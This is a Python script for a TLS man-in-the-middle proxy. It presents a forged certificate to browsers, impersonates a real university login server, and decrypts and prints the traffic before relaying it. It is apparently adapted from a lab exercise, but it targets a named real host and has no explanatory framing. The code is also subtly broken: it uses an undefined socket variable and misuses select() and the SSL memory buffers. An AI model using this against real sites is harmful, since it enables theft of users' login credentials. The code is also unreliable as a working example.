#!/usr/bin/env python3  
import threading  
import ssl  
import socket  
import select # Import the select module
  
cadir = "/etc/ssl/certs"  
  
def process_request(ssock_for_browser):  
    hostname = "csujwc.its.csu.edu.cn"  
    # Make a connection to the real server  
    sock_for_server = socket.create_connection((hostname, 443))  
    # Set up the TLS context  
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  
    context.load_verify_locations(capath=cadir)  
    context.verify_mode = ssl.CERT_REQUIRED  
    context.check_hostname = True  
    print("sock_for_server")  
    ssock_for_server = context.wrap_socket(sock_for_server, server_hostname=hostname, do_handshake_on_connect=False)  
    ssock_for_server.do_handshake()  
      
    # Create a memory buffer for reading and writing data
    in_buffer = ssl.MemoryBIO()
    out_buffer = ssl.MemoryBIO()
    
    # Create an SSLObject object for proxy and browser communication
    sobj_for_browser = context_srv.wrap_bio(in_buffer, out_buffer, server_side=True)
    
    # Perform the SSL handshake
    sobj_for_browser.do_handshake()
    
    # Loop until the connection is closed
    while True:
        # Receive data from browser
        data = sock_for_browser.recv(2048)
        if not data:
            break
        
        # Write data to the input buffer
        in_buffer.write(data)
        
        # Check if the SSLObject object is ready to read
        if select.select([sobj_for_browser], [], [], 0)[0]:
            # Read and decrypt data from the SSLObject object
            de_data = sobj_for_browser.read()
            # Print the decrypted data on the screen
            print(de_data)
        
        # Write and encrypt data to the output buffer
        try:
            en_data = out_buffer.read()
            # Forward encrypted data to server
            ssock_for_server.sendall(en_data)
        except ssl.SSLWantWriteError:
            pass
        
        # Get response from server, and forward it to browser  
        response = ssock_for_server.recv(2048)  
        while response:  
            ssock_for_browser.sendall(response) # Forward to browser  
            response = ssock_for_server.recv(2048)  
          
    ssock_for_browser.shutdown(socket.SHUT_RDWR)  
    ssock_for_browser.close()  
     
SERVER_CERT = "./csulogin.crt"  
SERVER_PRIVATE = "./csulogin.key"  
context_srv = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  
context_srv.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)  
sock_listen = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)  
sock_listen.bind(("0.0.0.0", 443))  
sock_listen.listen(5)  
  
while True:  
    sock_for_browser, fromaddr = sock_listen.accept()  
    print(fromaddr)  

    
    x = threading.Thread(target=process_request, args=(sock_for_browser,))  
    x.start()

